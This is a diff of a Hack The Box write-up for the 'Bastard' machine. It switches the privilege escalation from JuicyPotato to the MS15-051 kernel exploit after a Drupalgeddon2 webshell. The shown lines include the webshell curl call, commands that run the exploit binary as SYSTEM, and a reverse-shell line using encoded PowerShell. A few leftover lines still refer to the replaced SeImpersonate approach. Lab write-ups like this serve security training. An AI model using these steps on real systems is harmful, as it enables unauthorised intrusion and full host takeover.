@@ -6,7 +6,7 @@ platform: Hack The Box
 category: Web / CMS
 state: Retired
 pwned: 2026-11-09
-tags: [windows, drupal, drupalgeddon2, cve-2018-7600, juicypotato, seimpersonate]
+tags: [windows, drupal, drupalgeddon2, cve-2018-7600, kernel, ms15-051, cve-2015-1701]
 ---
 
 # Bastard — Hack The Box
@@ -15,7 +15,7 @@ tags: [windows, drupal, drupalgeddon2, cve-2018-7600, juicypotato, seimpersonate
 
 ## TL;DR
 
-An unpatched **Drupal 7.54** falls to **Drupalgeddon2** (CVE-2018-7600): unauthenticated PHP execution lets you drop a webshell. The service runs as an account with `SeImpersonatePrivilege`, so **JuicyPotato** finishes the jump to `SYSTEM`.
+An unpatched **Drupal 7.54** falls to **Drupalgeddon2** (CVE-2018-7600): unauthenticated PHP execution lets you drop a webshell. The host is fully unpatched (`Hotfix(s): N/A`), so a kernel exploit, **MS15-051** (CVE-2015-1701), finishes the jump to `SYSTEM`.
 
 ## Recon
 
@@ -57,22 +57,22 @@ curl -s 'http://<TARGET_IP>/shell.php?cmd=whoami'
 
 The user is `nt authority\iusr` (IIS/Apache with PHP).
 
-## Escalation: JuicyPotato
+## Escalation: MS15-051
 
 ```cmd
 whoami /priv
 ```
 
-If `SeImpersonatePrivilege` is listed, upload `JuicyPotato.exe` and use a CLSID valid for the Windows build (Server 2012 R2 / 2016):
+With `Hotfix(s): N/A` on Server 2008 R2, upload the compiled MS15-051 exploit (`CVE-2015-1701`) and run it with the command you want as SYSTEM:
 
 ```cmd
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
+MS15-051x64.exe "whoami"        # expect nt authority\system
 ```
 
 With a reverse shell:
 
 ```cmd
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -nop -enc <BASE64>" -t * -c {CLSID}
+MS15-051x64.exe "powershell -nop -enc <BASE64>"
 ```
 
 Alternatives: `PrintSpoofer`, `RoguePotato`, `GodPotato` depending on the build.
@@ -81,7 +81,7 @@ Alternatives: `PrintSpoofer`, `RoguePotato`, `GodPotato` depending on the build.
 
 - **Exploit returns 200 with no output** → the parameter is mis-encoded; use a PoC supporting `--command`.
 - **`SeImpersonate` missing** → the webshell runs as another identity; check `whoami /priv` from the real process.
-- **JuicyPotato fails on `-c`** → the CLSID does not exist on that build; try several or switch tools.
+- **Wrong architecture** → the box is x64; using the x86 build fails silently.
 - **Webshell disappears** → the CMS cleans `sites/default/files`; use another writable path.
 
 ## Detection and mitigation
